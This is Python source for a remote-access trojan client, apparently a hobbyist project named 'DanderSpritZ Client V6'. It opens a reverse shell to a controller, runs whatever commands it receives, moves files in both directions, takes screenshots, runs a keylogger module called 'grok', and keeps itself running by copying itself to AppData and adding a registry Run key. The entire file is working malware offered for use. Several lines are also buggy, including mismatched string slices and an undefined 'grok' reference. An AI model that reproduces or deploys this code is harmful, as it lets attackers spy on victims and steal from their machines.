## DanderSpritZ Client V6 for Windows XP+
## By ShowNadda

# Global Imports
import socket
import termcolor
import json
import subprocess
import os
import pyautogui
import grok_06
import threading
import sys
import shutil
import time


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def upload_file(file_name):
    f = open(file_name, "rb")
    s.send(f.read())

def screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save("screen.png")

def download_file(file_name):
    f= open(file_name, "wb")
    s.settimeout(5)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
        s.settimeout(None)
        f.close

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def persist(reg_name, copy_name):
    file_location = os.environ["appdata"] + "\\" + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v " + reg_name + " /t REG_SZ /d " " + file_location + """,shell = True)
            reliable_send("[+] Created Persistence with Reg Key: " + reg_name)
        else:
            reliable_send("[!] Persistence already exists!")
    except:
        reliable_send("[!] Error: Failed to create Persistence on Target!")

def connection():
    while True:
        try:
            s.connect(("0.0.0.0", 8080))
            shell()
            s.close()
            break
        except:
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == "quit":
            break
        elif command == "background":
            pass
        elif command == "clear":
            os.system("clear")
        elif command == "help":
            pass
        elif command[:2] == "cd ":
            os.chdir(command[3:])
        elif command[:6] == "upload":
            download_file(command[7:])
        elif command[:8] == "download":
            upload_file(command[9:])
        elif command[:10] == "screenshot":
            screenshot()
            upload_file("screen.png")
            os.remove("screen.png")
        elif command[:10] == "grok_start":
            grok = grok.Grok()
            t = threading.Thread(target=grok.start)
            t.start()
            reliable_send("[!] Grok Started!")
        elif command[:9] == "grok_dump":
            logs = grok.read_logs()
            reliable_send(logs)
        elif command[:9] == "grok_quit":
            grok.self_destruct()
            t.join()
            reliable_send("Grok Quit!")
        elif command[:7] == "persist":
            reg_name, copy_name = command[:8].split(" ")
            persist(reg_name, copy_name)
        elif command[:7] == "sendall":
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()